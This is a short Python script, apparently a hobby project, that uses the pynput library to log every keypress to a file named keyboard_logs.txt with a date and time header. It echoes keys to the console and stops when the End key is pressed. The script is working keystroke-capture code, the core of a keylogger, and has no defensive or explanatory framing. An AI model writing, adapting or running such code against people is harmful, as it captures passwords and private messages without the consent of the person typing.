from pynput import keyboard
from datetime import date
import time
import logging
import os


# Getting Current Date and time
t = time.localtime()
timeNow = time.strftime("%H:%M:%S", t)
dateNow = date.today()

cwd = os.getcwd()
log_directory = os.path.join(cwd, "Key_logs")
if not os.path.exists(log_directory):
    os.makedirs(log_directory)

keyboard_logo = open("keyboard_logo.txt", "r")
logo = keyboard_logo.read()


def setup_logger(name, log_file, level=logging.INFO):
    """Function setup as many loggers as you want"""

    handler = logging.FileHandler(log_file)

    logger = logging.getLogger(name)
    logger.setLevel(level)
    logger.addHandler(handler)

    return logger


key_logger = setup_logger('key_logger', 'Key_logs/keyboard_logs.txt')
key_logger.info("Date: " + str(dateNow)+"\n")
key_logger.info("Time: "+str(timeNow)+"\n\n\n\n\n")

logs = open("Key_logs/keyboard_logs.txt", "a")
logs.truncate(0)

key_logger.info(logo)


def on_press(key):
    if key == keyboard.Key.end:
        print("STOPPED KEYBOARD LOGGER")
        return False
    else:
        if key == keyboard.Key.enter or key == keyboard.Key.space:
            key_logger.info("\n")
            print("\n")
        else:
            key_logger.info(str(key))
            print(str(key))


# Collect all Events
with keyboard.Listener(
        on_press=on_press) as listener:
    listener.join()
